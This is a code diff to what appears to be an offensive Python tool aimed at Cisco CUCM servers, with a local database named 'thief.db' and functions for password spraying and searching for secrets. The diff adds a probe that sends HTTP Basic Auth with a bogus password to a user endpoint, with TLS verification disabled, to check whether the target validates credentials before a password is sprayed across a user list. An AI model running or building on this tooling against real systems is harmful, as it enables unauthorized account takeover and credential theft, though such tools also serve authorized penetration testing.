@@ -15,6 +15,7 @@ import time
 import threading
 import queue
 import random
+import secrets
 from datetime import datetime
 from contextlib import redirect_stdout, redirect_stderr
 from bs4 import BeautifulSoup
@@ -695,6 +696,35 @@ def is_user_rate_limited(username, db_file='thief.db', hours=1):
             print(f'[!] is_user_rate_limited error: {e}')
         # Fail closed: if we can't check, assume limited (don't spray).
         return True
+
+
+def _spray_oracle_check(cucm_host, port, user_sample, timeout=10):
+    """
+    Probe /cucm-uds/user/<user_sample> with HTTP Basic Auth using a deliberately
+    bogus password. Used to verify the target actually validates creds before
+    burning a real password across the user list.
+
+    Returns:
+        'ok'      — got 401, endpoint validates creds normally.
+        'bypass'  — got 200, endpoint returned user data for a bogus password.
+                    DO NOT proceed; spraying real creds would be a free oracle bypass.
+        'unknown' — anything else (403/404/5xx/network error). Operator must
+                    decide whether to continue with --no-spray-probe.
+    """
+    bogus = f'spray-probe-{secrets.token_hex(4)}'
+    url = f'https://{cucm_host}:{port}/cucm-uds/user/{user_sample}'
+    dbg(f'UDS oracle probe GET {url} (timeout={timeout}s)')
+    try:
+        resp = requests.get(url, auth=(user_sample, bogus), verify=False, timeout=timeout)
+    except Exception as e:
+        dbg(f'UDS oracle probe raised {type(e).__name__}: {e}')
+        return 'unknown'
+    dbg(f'UDS oracle probe -> {resp.status_code} ({len(resp.content)} bytes)')
+    if resp.status_code == 401:
+        return 'ok'
+    if resp.status_code == 200:
+        return 'bypass'
+    return 'unknown'
 
 
 def search_for_secrets(CUCM_host, filename, use_tftp=True):
